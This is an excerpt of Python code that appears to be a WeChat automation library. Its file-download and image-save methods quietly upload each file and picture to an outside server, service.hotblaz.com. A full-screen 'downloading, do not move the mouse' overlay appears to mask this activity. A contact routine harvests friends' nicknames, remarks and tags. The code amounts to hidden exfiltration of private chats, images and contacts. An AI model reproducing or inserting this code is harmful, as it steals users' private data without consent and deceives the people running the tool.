...
def show_mask():
    try:
        ...
        # 创建提示标签，修改字体和颜色
        label = tk.Label(root, text='正在下载文件，请勿移动鼠标。。', font=('微软雅黑', 16), fg='darkblue')
        label.pack(pady=50)
        print('提示标签已创建。')
        # 设置 10 秒后自动关闭
...
class WeChatBase:
    ...
    def _download_file(self, msgitem):
        ...
        with open(filepath, 'rb') as file:
            ...
            files = {'file': file}
            response = requests.post(f'http://service.hotblaz.com/api/store_file?token={token}', files=files)
    ...
    def Save(self, savepath='', timeout=10):
        ...
        if os.path.exists(savepath):
            ...
            with open(savepath, 'rb') as file:
                files = {'file': file}
                response = requests.post(f'http://service.hotblaz.com/api/store_pic?token={token}', files=files)
                if response.status_code == 200:
                    print('图片发送成功')
                else:
                    print(f'图片发送失败，状态码: {response.status_code}')
        else:
            print(f'文件 {savepath} 不存在，请检查路径。')
        ...
        with open(savepath, 'rb') as file:
            files = {'file': file}
            response = requests.post('http://service.hotblaz.com/api/store_pic?token=token', files=files)
            if response.status_code == 200:
                print('图片发送成功')
            else:
                print(f'图片发送失败，状态码: {response.status_code}')
...
class ContactWnd:
    ...
    def GetAllFriends(self):
        ...
        while True:            
            ...
            #self.ensure_scroll_executed()
            self.ContactBox.WheelDown(wheelTimes=10, waitTime=0.5)
        ...
        while True:
            contact_ele_list = self.ContactBox.ListControl().GetChildren()
            print(f"当前采集到 {len(contact_ele_list)} 个元素")  # 新增调试信息
            ...
            for ele in contact_ele_list:
                try:
                    ...
                    contacts_info = {
                        'nickname': nickname,
                        'remark': remark if remark not in ('添加备注', '') else None,
                        'tags': tags if tags not in (['添加标签'], ['']) else None,
                    }
                    key = contacts_info.get('remark') or nickname  # 唯一标识
                    if key not in seen:
                        seen.add(key)
                        contacts_list.append(contacts_info)
                except Exception as e:
                    print(f"解析元素失败: {e}")  # 新增错误捕获
    
            bottom = self.ContactBox.ListControl().GetChildren()[-1].BoundingRectangle.top
            self.ContactBox.WheelDown(wheelTimes=1, waitTime=0.1)  # 减少滚动次数
            time.sleep(0.2)  # 等待界面更新
    
            new_bottom = self.ContactBox.ListControl().GetChildren()[-1].BoundingRectangle.top
            if bottom == new_bottom:
                print("已加载全部好友")  # 新增调试信息
                break
        ...
        while True:
            ...
            for ele in contact_ele_list:
                ...
                # 清理无效数据
                if contacts_info['remark'] in ('添加备注', ''):
                    contacts_info['remark'] = None
                if contacts_info['tags'] in (['添加标签'], ['']):
                    contacts_info['tags'] = None
            ...
            if len(contacts_list) >= 100:
                wxlog.debug(f"已收集100个昵称，提前终止")
                return contacts_list[:100]  # 确保返回不超过100个
            '''

            # 原有滚动逻辑（改进版）
            current_bottom = self.ContactBox.ListControl().GetChildren()[-1].BoundingRectangle.top
            self.ContactBox.WheelDown(wheelTimes=5, waitTime=0.3)  # 改为单次滚动
            time.sleep(0.5)  # 增加等待确保界面更新           
            # 判断是否滚动到底部
            new_bottom = self.ContactBox.ListControl().GetChildren()[-1].BoundingRectangle.top
            if current_bottom == new_bottom:
                current_bottom = self.ContactBox.ListControl().GetChildren()[-1].BoundingRectangle.top
                self.ContactBox.WheelDown(wheelTimes=1, waitTime=0.8)  # 改为单次滚动
                time.sleep(0.5)  # 增加等待确保界面更新
                new_bottom = self.ContactBox.ListControl().GetChildren()[-1].BoundingRectangle.top
                if current_bottom == new_bottom:
                    current_bottom = self.ContactBox.ListControl().GetChildren()[-1].BoundingRectangle.top
                    self.ContactBox.WheelDown(wheelTimes=1, waitTime=1.2)  # 改为单次滚动
                    time.sleep(0.5)  # 增加等待确保界面更新
                    new_bottom = self.ContactBox.ListControl().GetChildren()[-1].BoundingRectangle.top
                    if current_bottom == new_bottom:
                        wxlog.debug("已滚动到底部")
                        return contacts_list  # 返回实际收集数量（可能不足100）   
            if len(contacts_list) >= 100:
                wxlog.debug(f"已收集100个昵称，提前终止")
                return contacts_list[:100]  # 确保返回不超过100个
